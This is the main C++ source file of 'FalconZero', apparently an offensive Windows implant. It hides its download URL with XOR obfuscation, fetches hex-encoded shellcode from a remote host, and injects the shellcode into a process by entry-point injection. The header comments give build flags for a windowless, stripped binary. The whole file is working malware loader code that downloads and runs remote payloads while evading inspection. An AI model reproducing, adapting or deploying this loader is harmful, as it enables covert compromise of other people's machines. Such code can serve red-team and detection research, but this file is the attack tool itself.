// Filename: falcon_zero.cpp
// Author: slaeryan
// Version: 1.0(Alpha Release)
// Purpose: This is the main source which defines the entry point of the 
// FalconZero implant.
// Compile with: (Release)i686-w64-mingw32-g++ falcon_zero.cpp fetcher.cpp converter.cpp safety_measures.cpp injector.cpp xor.cpp -o falcon_zero.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
//               (Debug)i686-w64-mingw32-g++ falcon_zero.cpp fetcher.cpp converter.cpp safety_measures.cpp injector.cpp xor.cpp -o falcon_zero.exe -lurlmon -lntdll -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
// Testing: https://raw.githubusercontent.com/upayansaha/DigitalOceanTest/master/messagebox_shellcode_hex_32.txt


#include "falcon_zero.h"
//#include <iostream>

using namespace std;

//int main() {
// Main entry point for FalconZero implant
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	if (!validateEndpoint()) {
		ExitProcess((UINT) NULL);
	}
    char key[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"; // CHANGE ME
    char downloadURL[] = { 0x29, 0x36, 0x37, 0x34, 0x36, 0x7c, 0x68, 0x67, 0x3b, 0x2b, 0x3c, 0x62, 0x2a, 0x27, 0x3b, 0x38, 0x24, 0x30, 0x26, 0x27, 0x30, 0x24, 0x34, 0x37, 0x37, 0x2e, 0x24, 0x2c, 0x37, 0x6a, 0x26, 0x29, 0x2a, 0x67, 0x3a, 0x26, 0x2a, 0x29, 0x3f, 0x37, 0x2e, 0x3e, 0x7e, 0x16, 0x3a, 0x33, 0x3c, 0x22, 0x36, 0x34, 0x16, 0x39, 0x24, 0x23, 0x2d, 0x10, 0x20, 0x35, 0x33, 0x67, 0x24, 0x2b, 0x38, 0x38, 0x28, 0x3c, 0x60, 0x3d, 0x34, 0x21, 0x20, 0x35, 0x32, 0x33, 0x35, 0x37, 0x21, 0x5, 0x32, 0x2a, 0x26, 0x28, 0x29, 0x25, 0x28, 0x2c, 0x2c, 0x15, 0x23, 0x29, 0x35, 0x11, 0x7c, 0x62, 0x7f, 0x26, 0x2b, 0x20 };
    XOR(downloadURL, sizeof(downloadURL), key, sizeof(key));
    string sdownloadURL;
    int len_downloadURL = sizeof(downloadURL);
    for (int i = 0; i < len_downloadURL; i++) { 
        sdownloadURL = sdownloadURL + downloadURL[i]; 
    }
    //cout << sdownloadURL << endl;
    string shellcodeHexS = downloadResource((char*)sdownloadURL.c_str());
    int length_shellcodeHexS = shellcodeHexS.length();
    int shellcode_len = length_shellcodeHexS/2;
    //cout << shellcode_len << endl;
    unsigned char* shellcodeHex = (unsigned char*)shellcodeHexS.c_str();
    //cout << shellcodeHex << endl;
    unsigned char* shellcodeByte = toBytes(shellcodeHex);
    //cout << shellcodeByte << endl;
    //executeShellcode(shellcodeByte);
    addressOfEntryPointInjection(shellcodeByte, shellcode_len);
    ExitProcess((UINT) NULL);
}